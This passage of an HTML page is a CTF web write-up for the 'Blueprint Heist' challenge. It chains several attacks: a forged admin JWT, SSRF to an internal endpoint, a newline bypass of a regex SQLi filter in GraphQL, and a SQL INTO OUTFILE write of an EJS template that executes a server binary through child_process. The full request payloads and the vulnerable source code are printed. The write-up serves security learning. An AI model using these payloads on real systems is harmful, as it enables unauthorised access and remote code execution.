</doc-codeblock></div>
<img src="https://github.com/blog-tamilctf/blog-tamilctf.github.io/blob/main/assets/img/node.jpeg?raw=true" height=400px>
<ul>
<li>Okay! we found the real secret key this time :D</li>
<li>Crafted the admin token and supplied to the endpoint <code v-pre>admin?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4iLCJyZXF1aXJlZFJvbGUiOiJhZG1pbiIsImlhdCI6MTcxNjIxMjM3M30.Cf49E4-_dHEoTBfMfplbKikF1ns-LDjWR5ftHG-9bfk</code></li>
</ul>
<img src="https://github.com/blog-tamilctf/blog-tamilctf.github.io/blob/main/assets/img/internal.jpg?raw=true" height=400px>
<ul>
<li>We have a valid admin token, now we need to bypass the <code v-pre>checkInternal(req)</code> function.</li>
</ul>
<doc-anchor-target id="more-ssrf">
    <h4>
        <doc-anchor-trigger class="header-anchor-trigger" to="#more-ssrf">#</doc-anchor-trigger>
        <span>More SSRF:</span>
    </h4>
</doc-anchor-target>
<ul>
<li><p>Since we have an ssrf within the url param and we can use that to call the internal endpoint? and it will satisfy the <code v-pre>checkInternal(req)</code>.</p>
</li>
<li><p>By going through the source file,the application was exposed on 1337 port and binded on 0.0.0.0</p>
</li>
</ul>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">const port = 1337;
	app.listen(port, '0.0.0.0', ())</code></pre>
</doc-codeblock></div>
<ul>
<li>We can supply <code v-pre>http://0.0.0.0:1337/admin?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4iLCJyZXF1aXJlZFJvbGUiOiJhZG1pbiIsImlhdCI6MTcxNjIxMjM3M30.Cf49E4-_dHEoTBfMfplbKikF1ns-LDjWR5ftHG-9bfk</code> in the url to see the response.</li>
</ul>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">POST /download?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoidXNlciIsImlhdCI6MTcxNjIxMDUzMX0.2gwPTRqbPfj4Axbz2B3t4HNWHHdcgIXgTCcCyGaupW0 HTTP/1.1
Host: host:30586
Content-Type: application/x-www-form-urlencoded
Content-Length: 89

url=http://0.0.0.0:1337/admin?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4iLCJyZXF1aXJlZFJvbGUiOiJhZG1pbiIsImlhdCI6MTcxNjIxMjM3M30.Cf49E4-_dHEoTBfMfplbKikF1ns-LDjWR5ftHG-9bfk</code></pre>
</doc-codeblock></div>
<img src="https://github.com/blog-tamilctf/blog-tamilctf.github.io/blob/main/assets/img/adminaccess.jpg?raw=true" height=600px>
<ul>
<li>We have the admin token and way to make internal requests and hence now we can start checking the internal routes for further escalation.</li>
</ul>
<doc-anchor-target id="graphql-and-sqli">
    <h4>
        <doc-anchor-trigger class="header-anchor-trigger" to="#graphql-and-sqli">#</doc-anchor-trigger>
        <span>Graphql and SQLI??</span>
    </h4>
</doc-anchor-target>
<ul>
<li>The internal route has a graphql endpoint <code v-pre>router.all(&quot;/graphql&quot;, authMiddleware(&quot;admin&quot;)</code> and reviewing the source reveals a potential sql injection.</li>
</ul>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">------schema.js---------
const { GraphQLObjectType, GraphQLSchema, GraphQLString, GraphQLList } = require('graphql');
const UserType = require(&quot;../models/users&quot;)
const { detectSqli } = require(&quot;../utils/security&quot;)
const { generateError } = require('../controllers/errorController');

const RootQueryType = new GraphQLObjectType({
  name: 'Query',
  fields: {
    getAllData: {
      type: new GraphQLList(UserType),
      resolve: async(parent, args, { pool }) =&gt; {
        let data;
        const connection = await pool.getConnection();
        try {
            data = await connection.query(&quot;SELECT * FROM users&quot;).then(rows =&gt; rows[0]);
        } catch (error) {
            generateError(500, error)
        } finally {
            connection.release()
        }
        return data;
      }
    },
    getDataByName: {
      type: new GraphQLList(UserType),
      args: {
        name: { type: GraphQLString }
      },
      resolve: async(parent, args, { pool }) =&gt; {
        let data;
        const connection = await pool.getConnection();
        console.log(args.name)
        if (detectSqli(args.name)) {
          return generateError(400, &quot;Username must only contain letters, numbers, and spaces.&quot;)
        }
        try {
            data = await connection.query(`SELECT * FROM users WHERE name like '%${args.name}%'`).then(rows =&gt; rows[0]);
        } catch (error) {
            return generateError(500, error)
        } finally {
            connection.release()
        }
        return data;
      }
    }
  }
});

const schema = new GraphQLSchema({
  query: RootQueryType
});

module.exports = schema;</code></pre>
</doc-codeblock></div>
<ul>
<li>There were only two queries <code v-pre>getAllData</code> which will list all user data and <code v-pre>getDataByName</code> where we can supply a name and it will search for the username.</li>
</ul>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">{getAllData{name department isPresent}}

{getDataByName(name:&quot;John&quot;){name department isPresent}}</code></pre>
</doc-codeblock></div>
<ul>
<li>Within the admin endpoint, there is option to search username and get all users through graphql which was executing in POST request.</li>
</ul>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">
function getToken() {
    const urlParams = new URLSearchParams(window.location.search);
    return urlParams.get('token')
  }

  async function fetchAbsence() {
    const token = getToken();

    const url = `/graphql?token=${token}`;

    const query = `{
        getAllData {
            name
            department
            isPresent
        }
    }`;

    fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({ query }),
    })
    .then(response =&gt; response.json())
    .then(data =&gt; {
        if (data.errors) {
            console.error(&quot;Error fetching data:&quot;, data.errors);
        } else {
            const absenceContainer = document.getElementById('absenceContainer');
            absenceContainer.innerHTML = '';

            data.data.getAllData.forEach(({ name, department, isPresent }) =&gt; {
                const row = document.createElement('tr');
                row.innerHTML = `
                    &lt;td&gt;${name}&lt;/td&gt;
                    &lt;td&gt;${department}&lt;/td&gt;
                    &lt;td&gt;${isPresent ? &quot;Present&quot; : &quot;Absent&quot;}&lt;/td&gt;
                `;
                absenceContainer.appendChild(row);
            });
        }
    })
    .catch(error =&gt; {
        console.error(&quot;Error fetching data:&quot;, error);
    });
}

document.getElementById('fetchUserForm').addEventListener('submit', function(event) {
    event.preventDefault();
    const token = getToken()

    const username = document.getElementById('username').value;
    fetch(`/graphql?token=${token}`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            query: `{
                getDataByName(name: &quot;${username}&quot;) {
                    name
                    department
                    isPresent
                }
            }`
        })
    })
    .then(response =&gt; response.json())
    .then(data =&gt; {
        const absenceContainer = document.getElementById('absenceContainer');
        absenceContainer.innerHTML = '';
        if (data.errors) {
            console.error('Error fetching user data:', data.errors);
        } else if (data.data.getDataByName) {
            data.data.getDataByName.forEach(({ name, department, isPresent }) =&gt; {
                const row = document.createElement('tr');
                row.innerHTML = `
                    &lt;td&gt;${name}&lt;/td&gt;
                    &lt;td&gt;${department}&lt;/td&gt;
                    &lt;td&gt;${isPresent ? &quot;Present&quot; : &quot;Absent&quot;}&lt;/td&gt;
                `;
                absenceContainer.appendChild(row);
            });
        } else {
            console.log('No user found with the provided username:', username);
        }
    })
    .catch(error =&gt; {
        console.error('Error fetching user data:', error);
    });
});

fetchAbsence()</code></pre>
</doc-codeblock></div>
<ul>
<li>We know graphql supports get method too and we can try that to execute a query.</li>
</ul>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">POST /download?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoidXNlciIsImlhdCI6MTcxNjIxMDUzMX0.2gwPTRqbPfj4Axbz2B3t4HNWHHdcgIXgTCcCyGaupW0 HTTP/1.1
Host: host:30586
Content-Type: application/x-www-form-urlencoded
Content-Length: 89

url=http://0.0.0.0:1337/graphql?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4iLCJyZXF1aXJlZFJvbGUiOiJhZG1pbiIsImlhdCI6MTcxNjIxMjM3M30.Cf49E4-_dHEoTBfMfplbKikF1ns-LDjWR5ftHG-9bfk%26query={getAllData{name%20department%20isPresent}}</code></pre>
</doc-codeblock></div>
<img src="https://github.com/blog-tamilctf/blog-tamilctf.github.io/blob/main/assets/img/graphql.png?raw=true" height=400px>
<ul>
<li>Now we can try the graphql search query to exploit the sqli injection possibly?</li>
<li>At glance seemed like a easy SQLI <code v-pre>SELECT * FROM users WHERE name like '%${args.name}%'</code> but not :(</li>
</ul>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">------schema.js---------
if (detectSqli(args.name)) {
          return generateError(400, &quot;Username must only contain letters, numbers, and spaces.&quot;)
        }


------security.js---------
function detectSqli (query) {
    const pattern = /^.*[!#$%^&amp;*()\-_=+{}\[\]\\|;:'\&quot;,.&lt;&gt;\/?]/
    return pattern.test(query)
}</code></pre>
</doc-codeblock></div>
<ul>
<li>The <code v-pre>detectSqli</code> function blocks all the possible special characters in our graphql query before appending to the sql query.</li>
<li>Got stuck at this point for a while,i thought there is no way to bypass the regex and started to do lot of workarounds.</li>
<li>Maybe gopher to sql? we have db username and pass [FAILED]</li>
<li>Tried reading lot of system files through ssrf [NOTHING INTERESTING]</li>
<li>Then i tried to validate the regex once again! [best decision]</li>
</ul>
<img src="https://github.com/blog-tamilctf/blog-tamilctf.github.io/blob/main/assets/img/nl.jpg?raw=true">
<ul>
<li>!!!! New line injection , we found our regex bypass!</li>
<li>With that in hand, i tried to inject the newline sql injection to break the query and noticed whether any error appeared.[ <code v-pre>{getDataByName(name:&quot;John\n '&quot;){name%20department%20isPresent}}</code>]</li>
</ul>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">POST /download?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoidXNlciIsImlhdCI6MTcxNjIxMDUzMX0.2gwPTRqbPfj4Axbz2B3t4HNWHHdcgIXgTCcCyGaupW0 HTTP/1.1
Host: host:30586
Content-Type: application/x-www-form-urlencoded
Content-Length: 89

url=http://0.0.0.0:1337/graphql?query={getDataByName(name:&quot;John\n '&quot;){name%20department%20isPresent}}%26token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4iLCJyZXF1aXJlZFJvbGUiOiJhZG1pbiIsImlhdCI6MTcxNjIxMjM3M30.Cf49E4-_dHEoTBfMfplbKikF1ns-LDjWR5ftHG-9bfk</code></pre>
</doc-codeblock></div>
<img src="https://github.com/blog-tamilctf/blog-tamilctf.github.io/blob/main/assets/img/sql.jpg?raw=true">
<ul>
<li>We got through this ! now we need to somehow escalate this sqli to read the flag.</li>
<li>The flag.txt was compiled as a binary named <code v-pre>/readflag</code></li>
<li>We need to call the binary through sqli?</li>
</ul>
<doc-anchor-target id="sqli-write-and-ejs-template-injection">
    <h4>
        <doc-anchor-trigger class="header-anchor-trigger" to="#sqli-write-and-ejs-template-injection">#</doc-anchor-trigger>
        <span>SQLI write and EJS template injection:</span>
    </h4>
</doc-anchor-target>
<ul>
<li>We have the db file given,we have 4 columns and 2 columns <code v-pre>name,department</code> are TEXT,hence it will reflect.</li>
</ul>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">CREATE TABLE construction.users (
    id INTEGER PRIMARY KEY AUTO_INCREMENT,
    name TEXT,
    department TEXT,
    isPresent BOOLEAN
);</code></pre>
</doc-codeblock></div>
<ul>
<li>Forming the SQL query <code v-pre>' UNION SELECT 1,user(),database(),4-- -</code></li>
</ul>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">POST /download?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoidXNlciIsImlhdCI6MTcxNjIxMDUzMX0.2gwPTRqbPfj4Axbz2B3t4HNWHHdcgIXgTCcCyGaupW0 HTTP/1.1
Host: host:30586
Content-Type: application/x-www-form-urlencoded
Content-Length: 89

url=http://0.0.0.0:1337/graphql?query={getDataByName(name:&quot;John\n%20'%20UNION%20SELECT%201,user(),database(),4--%20-&quot;){name%20department%20isPresent}}%26token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4iLCJyZXF1aXJlZFJvbGUiOiJhZG1pbiIsImlhdCI6MTcxNjIxMjM3M30.Cf49E4-_dHEoTBfMfplbKikF1ns-LDjWR5ftHG-9bfk</code></pre>
</doc-codeblock></div>
<img src="https://github.com/blog-tamilctf/blog-tamilctf.github.io/blob/main/assets/img/sqli.jpeg?raw=true" height=400px>
<ul>
<li><p>Noticed we can do <code v-pre>load_file</code> and <code v-pre>outfile</code> with the SQLI.</p>
</li>
<li><p><code v-pre>LOAD FILE:</code> Reads the file from the server and returns to the user on the screen, It will show the file contents as a string on the screen.</p>
</li>
<li><p><code v-pre>OUTFILE:</code> it writes the resulting rows to a file, and allows the use of column and row terminators to specify a particular output format. the file is created on the server host, so you must have the file privilege to use this syntax. File to be written cannot be an existing file, which among other things prevents files (such as “/etc/passwd”) and database tables from being destroyed.</p>
</li>
</ul>
<p>ref : <a href="https://blog.certcube.com/advance-sql-injections-with-loadfile-and-outfile/">https://blog.certcube.com/advance-sql-injections-with-loadfile-and-outfile/</a></p>
<ul>
<li>Then i tried loading the <code v-pre>/readflag</code> into the injection point, below were the result - printed as binary !!</li>
</ul>
<img src="https://github.com/blog-tamilctf/blog-tamilctf.github.io/blob/main/assets/img/load.jpeg?raw=true" height=600px>
<ul>
<li><p>We know now the attack point is to write a file and maybe get a reverse shell to <code v-pre>/readflag</code> or even print the result of <code v-pre>/readflag</code> somehow.</p>
</li>
<li><p>Got stuck here for sometime to identify where we need write our file to make the server display flag.</p>
</li>
<li><p>Then <code v-pre>malformx</code>(teammate) gave an idea to write our payload as ejs and make the server render it! but how?</p>
</li>
</ul>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">------errorController.js--------
const fs = require('fs');
const path = require('path');

function generateError(status, message) {
    const err = new Error(message);
    err.status = status;
    return err;
};

const renderError = (err, req, res) =&gt; {
    res.status(err.status);
    const templateDir = __dirname + '/../views/errors';
    const errorTemplate = (err.status &gt;= 400 &amp;&amp; err.status &lt; 600) ? err.status : &quot;error&quot;
    let templatePath = path.join(templateDir, `${errorTemplate}.ejs`);

    if (!fs.existsSync(templatePath)) {
        templatePath = path.join(templateDir, `error.ejs`);
    }
    console.log(templatePath)
    res.render(templatePath, { error: err.message }, (renderErr, html) =&gt; {
        res.send(html);
    });
};

module.exports = { generateError, renderError }</code></pre>
</doc-codeblock></div>
<ul>
<li><p>Here depend on the error status code, a template file is rendered from  <code v-pre>/views/errors/{errorcode}.ejs</code> and if it does not found returns to  <code v-pre>error.ejs</code>.</p>
</li>
<li><p>We cant override any exisiting files ,maybe we should prdouce a non generic error code and write a file within <code v-pre>/views/errors/{ourerrorcode}.ejs</code> to render our flag?</p>
</li>
<li><p>Quickly noticing the file structure.</p>
</li>
</ul>
<img src="https://github.com/blog-tamilctf/blog-tamilctf.github.io/blob/main/assets/img/missing.png?raw=true" height=200px>
<ul>
<li><p>wewww! there is no 404 template and it easy to trigger a 404 error, so our idea is to write a 404.ejs using SQLi outfile and render a template to read the flag.</p>
</li>
<li><p>The payload to write <code v-pre>&lt;p&gt;&lt;%=process.mainModule.require('child_process').execSync('/readflag') %&gt;&lt;/p&gt;</code> as <code v-pre>404.ejs</code> and into the directory <code v-pre>/app/views/errors/404.ejs</code></p>
</li>
</ul>
<doc-anchor-target id="payload">
    <h4>
        <doc-anchor-trigger class="header-anchor-trigger" to="#payload">#</doc-anchor-trigger>
        <span>Payload:</span>
    </h4>
</doc-anchor-target>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">{getDataByName(name:&quot;admin\n' union select 1,'&lt;p&gt;&lt;%= process.mainModule.require(\&quot;child_process\&quot;).execSync(\&quot;/readflag\&quot;) %&gt;&lt;/p&gt;',2,3 into outfile '/app/views/errors/404.ejs'-- &quot;){name
department
isPresent
}}</code></pre>
</doc-codeblock></div>
<ul>
<li>We need to send the above payload in the request.</li>
</ul>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">POST /download?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoidXNlciIsImlhdCI6MTcxNjIxMDUzMX0.2gwPTRqbPfj4Axbz2B3t4HNWHHdcgIXgTCcCyGaupW0 HTTP/1.1
Host: host:30586
Content-Type: application/x-www-form-urlencoded
Content-Length: 89

url=http://0.0.0.0:1337/graphql?query=%257bgetDataByName(name%253a%2522admin%255cn'%2520union%2520select%25201%252c'%253cp%253e%253c%2525%253d%2520process.mainModule.require(%255c%2522child_process%255c%2522).execSync(%255c%2522%252freadflag%255c%2522)%2520%2525%253e%253c%252fp%253e'%252c2%252c3%2520into%2520outfile%2520'%252fapp%252fviews%252ferrors%252f404.ejs'--%2520%2522)%257bname%250adepartment%250aisPresent%250a%257d%257d%26token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4iLCJyZXF1aXJlZFJvbGUiOiJhZG1pbiIsImlhdCI6MTcxNjIxMjM3M30.Cf49E4-_dHEoTBfMfplbKikF1ns-LDjWR5ftHG-9bfk</code></pre>
</doc-codeblock></div>
<ul>
<li>Now we just need to trigger the 404 error by calling not existing files in the server to retrieve the flag.</li>
</ul>
<img src="https://github.com/blog-tamilctf/blog-tamilctf.github.io/blob/main/assets/img/flag.jpeg?raw=true" height=200px>
<ul>
<li>We finally cracked the challenge! That was quite a bit of chaining.</li>
</ul>

                                <div class="flex items-center mt-6 mb-6 clear-both">
                                    <span>
                                        <a href="../../../tags/">
                                            <svg class="inline-block -mb-px mr-1.5 text-blue-500 dark:text-blue-400" xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" overflow="visible" fill="currentColor"><g><path d="M21.3 9.88l-8.59-8.59C12.52 1.11 12.27 1 12 1H2c-.55 0-1 .45-1 1v10c0 .27.11.52.29.71l8.59 8.58c.57.57 1.32.88 2.12.88s1.55-.31 2.12-.88l7.17-7.17a3.009 3.009 0 00.01-4.24zm-1.42 2.82l-7.17 7.17c-.39.39-1.02.39-1.42 0L3 11.59V3h8.59l8.29 8.29c.39.39.39 1.03 0 1.41z" /><path d="M7.01 6C6.45 6 6 6.45 6 7s.45 1 1 1 1-.45 1-1-.44-1-.99-1z" /></g></svg>
                                        </a>
                                        <span class="mr-2"><a href="../../../tags/sqli/" class="no-link inline-flex align-middle items-center justify-center font-medium leading-none whitespace-nowrap text-blue-500 dark:text-blue-400 border border-blue-500 dark:border-blue-400 hover:bg-blue-100 dark:hover:bg-transparent dark:hover:border-blue-200 dark:hover:text-blue-200 transition-colors duration-200 ease-out h-6 px-2 text-xs rounded-md">
                                    <span>sqli</span>
                                </a></span>
                                        <span class="mr-2"><a href="../../../tags/ssrf/" class="no-link inline-flex align-middle items-center justify-center font-medium leading-none whitespace-nowrap text-blue-500 dark:text-blue-400 border border-blue-500 dark:border-blue-400 hover:bg-blue-100 dark:hover:bg-transparent dark:hover:border-blue-200 dark:hover:text-blue-200 transition-colors duration-200 ease-out h-6 px-2 text-xs rounded-md">
                                    <span>ssrf</span>
                                </a></span>
                                    </span>
                                </div>
                
                                <!-- Required only on API pages -->
                                <doc-toolbar-member-filter-no-results></doc-toolbar-member-filter-no-results>
                            </div>
                            <footer class="clear-both">
                            
                                <nav class="flex mt-14">
                                    <div class="w-1/2">
                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../../ctftime-writeups/hsctf23/web/">
                                            <svg xmlns="http://www.w3.org/2000/svg" class="mr-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19 11H7.41l5.29-5.29a.996.996 0 10-1.41-1.41l-7 7a1 1 0 000 1.42l7 7a1.024 1.024 0 001.42-.01.996.996 0 000-1.41L7.41 13H19c.55 0 1-.45 1-1s-.45-1-1-1z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
                                            <span>
                                                <span class="block text-xs font-normal text-gray-400 dark:text-dark-400">Previous</span>
                                                <span class="block mt-1">HSCTF 2023 Web writeup</span>
                                            </span>
                                        </a>
                                    </div>
                            
                                    <div class="w-1/2">
                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../../ctftime-writeups/inctf-21/finals-forensics-writeup/">
                                            <span>
                                                <span class="block text-xs font-normal text-right text-gray-400 dark:text-dark-400">Next</span>
                                                <span class="block mt-1">Inctf 21 Pro Finals Forensics Writeup</span>
                                            </span>
                                            <svg xmlns="http://www.w3.org/2000/svg" class="ml-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19.92 12.38a1 1 0 00-.22-1.09l-7-7a.996.996 0 10-1.41 1.41l5.3 5.3H5c-.55 0-1 .45-1 1s.45 1 1 1h11.59l-5.29 5.29a.996.996 0 000 1.41c.19.2.44.3.7.3s.51-.1.71-.29l7-7c.09-.09.16-.21.21-.33z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
                                        </a>
                                    </div>
                                </nav>
                            </footer>
                        </main>
                
                        <div class="border-t dark:border-dark-650 pt-6 mb-8">
                            <footer class="flex flex-wrap items-center justify-between">
                                <div>
                                    <ul class="flex flex-wrap items-center text-sm">
                                    </ul>
                                </div>
                                <div class="docs-copyright py-2 text-gray-500 dark:text-dark-350 text-sm leading-relaxed"><p>© TamilCTF 2024.</p></div>
                            </footer>
                        </div>
                    </div>
                
                    <!-- Rendered if sidebar right is enabled -->
                    <!-- Sidebar right skeleton-->
                    <div v-cloak class="fixed top-0 bottom-0 right-0 translate-x-full bg-white border-gray-200 lg:sticky lg:border-l lg:shrink-0 lg:pt-6 lg:transform-none sm:w-1/2 lg:w-64 lg:z-0 md:w-104 sidebar-right skeleton dark:bg-dark-850 dark:border-dark-650">
                        <div class="pl-5">
                            <div class="w-32 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
                            <div class="w-48 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
                            <div class="w-40 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
                        </div>
                    </div>
                
                    <!-- User should be able to hide sidebar right -->
                    <doc-sidebar-right v-cloak></doc-sidebar-right>
                </div>

            </div>
        </div>
    
        <doc-search-mobile></doc-search-mobile>
        <doc-back-to-top></doc-back-to-top>
    </div>


    <div id="docs-overlay-target"></div>

    <script data-cfasync="false">window.__DOCS__ = { "title": "Blueprint Heist", level: 3, icon: "file", hasPrism: false, hasMermaid: false, hasMath: false, tocDepth: 23 }</script>
</body>
</html>
